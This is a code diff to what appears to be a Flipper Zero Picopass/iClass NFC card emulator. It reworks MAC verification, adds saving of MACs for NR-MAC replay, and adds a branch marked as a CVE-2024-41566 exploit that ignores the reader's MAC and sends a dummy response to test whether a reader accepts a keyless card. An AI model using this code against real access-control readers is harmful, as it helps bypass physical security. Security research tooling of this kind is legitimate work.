@@ -375,20 +375,20 @@ PicopassListenerCommand
                         PICOPASS_FUSE_CRYPT10) != PICOPASS_FUSE_CRYPT0;
         if(!secured) break;
 
-        uint8_t rmac[4] = {};
-        uint8_t tmac[4] = {};
         const uint8_t* key = instance->data->card_data[instance->key_block_num].data;
-        bool no_key = !instance->data->card_data[instance->key_block_num].valid;
+        bool have_key = instance->data->card_data[instance->key_block_num].valid;
+        bool no_data = !instance->data->card_data[PICOPASS_ICLASS_PACS_CFG_BLOCK_INDEX].valid;
         const uint8_t* rx_data = bit_buffer_get_data(buf);
 
-        if(no_key) {
-            // We're emulating a partial dump of an iClass SE card and should capture the NR and MAC
+        if(no_data) {
+            // We're missing at least the first data block, save MACs for NR-MAC replay.
             command = picopass_listener_save_mac(instance, rx_data);
             break;
-        } else {
+        } else if(have_key) {
+            uint8_t rmac[4] = {};
+            uint8_t tmac[4] = {};
             loclass_opt_doBothMAC_2(instance->cipher_state, &rx_data[1], rmac, tmac, key);
 
-#ifndef PICOPASS_DEBUG_IGNORE_BAD_RMAC
             if(memcmp(&rx_data[5], rmac, PICOPASS_MAC_LEN)) {
                 // Bad MAC from reader, do not send a response.
                 FURI_LOG_I(TAG, "Got bad MAC from reader");
@@ -396,9 +396,20 @@ PicopassListenerCommand
                 picopass_listener_init_cipher_state(instance);
                 break;
             }
-#endif
 
             bit_buffer_copy_bytes(instance->tx_buffer, tmac, sizeof(tmac));
+            NfcError error = nfc_listener_tx(instance->nfc, instance->tx_buffer);
+            if(error != NfcErrorNone) {
+                FURI_LOG_D(TAG, "Failed tx update response: %d", error);
+                break;
+            }
+        } else {
+            // CVE-2024-41566 Exploit: The dump has no key, ignore the reader mac
+            // and a dummy response to see if the reader accepts it anyway
+            bit_buffer_reset(instance->tx_buffer);
+            for(size_t j = 0; j < 4; j++) {
+                bit_buffer_append_byte(instance->tx_buffer, 0xff);
+            }
             NfcError error = nfc_listener_tx(instance->nfc, instance->tx_buffer);
             if(error != NfcErrorNone) {
                 FURI_LOG_D(TAG, "Failed tx update response: %d", error);
